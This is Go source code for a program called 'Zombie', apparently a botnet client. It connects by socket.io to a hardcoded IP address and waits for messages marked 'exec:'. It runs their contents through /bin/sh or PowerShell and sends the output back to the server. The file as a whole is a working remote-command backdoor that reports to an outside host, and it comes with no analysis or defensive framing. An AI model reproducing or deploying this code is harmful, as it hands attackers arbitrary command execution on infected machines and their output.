package main

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/UPSJustin/GoZombie/zsupport"
	"github.com/zhouhui8915/go-socket.io-client"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func main() {

	zsupport.OutMessage("Starting Zombie")

	opts := &socketio_client.Options{
		Transport: "websocket",
		Query:     make(map[string]string),
	}

	uri := "http://138.197.30.113:80/socket.io/"

	client, err := socketio_client.NewClient(uri, opts)
	if err != nil {
		zsupport.OutMessage("Connection Failed to " + fmt.Sprint(uri))
		//log.Printf("NewClient error:%v\n", err)
		return
	}

	client.On("error", func() {
		log.Printf("on error\n")
	})
	client.On("connection", func() {
		log.Printf("on connect\n")

	})
	client.On("chat message", func(msg string) {
		log.Printf("on message:%v\n", msg)
		zsupport.OutMessage("DEBUG: " + fmt.Sprint(msg))

		if strings.Contains(msg, "exec:") {
			output := strings.SplitN(msg, " exec: ", 2)

			zsupport.OutMessage("DEBUG: " + fmt.Sprint(output[1]))
			if runtime.GOOS != "windows" {
				cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf(`%s`, output[1]))
				zsupport.OutMessage("DEBUG: " + fmt.Sprint(cmd))
				cmdOutput := &bytes.Buffer{}
				cmd.Stdout = cmdOutput
				err := cmd.Run()
				if err != nil {
					os.Stderr.WriteString(err.Error())
				}
				client.Emit("chat message", string(cmdOutput.Bytes()))
			} else {
				cmd := exec.Command("powershell.exe", fmt.Sprintf(`%s`, output[1]))
				zsupport.OutMessage("DEBUG: " + fmt.Sprint(cmd))
				cmdOutput := &bytes.Buffer{}
				cmd.Stdout = cmdOutput
				err := cmd.Run()
				if err != nil {
					os.Stderr.WriteString(err.Error())
				}
				client.Emit("chat message", string(cmdOutput.Bytes()))
			}
		}

	})
	client.On("disconnection", func() {
		log.Printf("on disconnect\n")
	})

	reader := bufio.NewReader(os.Stdin)

	for {
		data, _, _ := reader.ReadLine()

		command := string(data)

		client.Emit("chat message", command)
		//log.Printf("send message:%v\n", command)
	}
}
